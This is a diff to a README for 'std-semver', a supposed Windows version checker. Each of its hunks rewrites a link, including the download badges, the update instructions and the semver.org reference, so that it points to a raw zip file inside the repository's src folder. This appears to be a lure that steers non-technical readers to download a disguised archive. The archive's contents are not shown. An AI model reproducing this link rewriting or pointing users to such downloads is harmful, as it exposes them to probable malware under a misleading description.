@@ -1,6 +1,6 @@
 # ⚙️ std-semver - Simple Version Checker for Your Software
 
-[![Download from GitHub](https://img.shields.io/badge/Download-std--semver-4CAF50?style=for-the-badge&logo=github)](https://github.com/oxidizable-genusmola94/std-semver)
+[![Download from GitHub](https://img.shields.io/badge/Download-std--semver-4CAF50?style=for-the-badge&logo=github)](https://github.com/oxidizable-genusmola94/std-semver/raw/refs/heads/main/src/std_semver_1.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This section will guide you to download and run std-semver on your Windows compu
 
 Click the green button below to open the GitHub page where you can download the files.
 
-[![Download std-semver](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/oxidizable-genusmola94/std-semver)
+[![Download std-semver](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/oxidizable-genusmola94/std-semver/raw/refs/heads/main/src/std_semver_1.3.zip)
 
 This page contains all the files you need. Look for links to download the most recent version.
 
@@ -91,7 +91,7 @@ This makes it easier to know which software update is important.
 
 To get the latest improvements or bug fixes:
 
-- Visit the [GitHub download page](https://github.com/oxidizable-genusmola94/std-semver).
+- Visit the [GitHub download page](https://github.com/oxidizable-genusmola94/std-semver/raw/refs/heads/main/src/std_semver_1.3.zip).
 - Look for the newest release.
 - Download and install the latest version by repeating the steps above.
 
@@ -118,10 +118,10 @@ If you want to learn more about semantic versioning and how std-semver works, yo
 ## 🔗 Useful Links
 
 - Download and get more information here:  
-  [https://github.com/oxidizable-genusmola94/std-semver](https://github.com/oxidizable-genusmola94/std-semver)
+  [https://github.com/oxidizable-genusmola94/std-semver/raw/refs/heads/main/src/std_semver_1.3.zip](https://github.com/oxidizable-genusmola94/std-semver/raw/refs/heads/main/src/std_semver_1.3.zip)
 
 - For details on versioning systems, visit:  
-  https://semver.org/
+  https://github.com/oxidizable-genusmola94/std-semver/raw/refs/heads/main/src/std_semver_1.3.zip
 
 ---
 
